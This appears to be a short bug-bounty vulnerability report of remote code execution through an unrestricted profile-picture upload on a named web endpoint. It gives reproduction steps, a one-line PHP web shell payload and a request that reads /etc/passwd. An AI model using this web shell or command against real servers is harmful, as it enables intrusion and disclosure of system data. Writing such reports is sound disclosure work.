## Title
Remote Code Execution (RCE) at MTN carrer

## Vulnerability Type
Remote Code Execution (RCE)

## Summary  
The application at http://kzlabs.in/1623.php is vulnerable to Remote Code Execution (RCE), allowing an attacker to inject and execute arbitrary system commands on the underlying server. Successful exploitation could lead to unauthorized access, disclosure of sensitive information, modification of data, and complete compromise of the affected system.

## Vulnerable Endpoint
http://kzlabs.in/1623.php

## Steps to Reproduce  
1. Navigate to the following URL : `http://kzlabs.in/1623.php`
2. Login with Suitable Credentail.
3. Go to Profile and Click on add profile picture.
4. Just add the file with `.php ` having payload : `<?php echo system($_GET['cmd']); ?>`
5. Upload it . then open the image in new tab .
6. just add at the end `?cmd=cat /etc/passwd`


## Payload Used
`<?php echo system($_GET['cmd']); ?>`
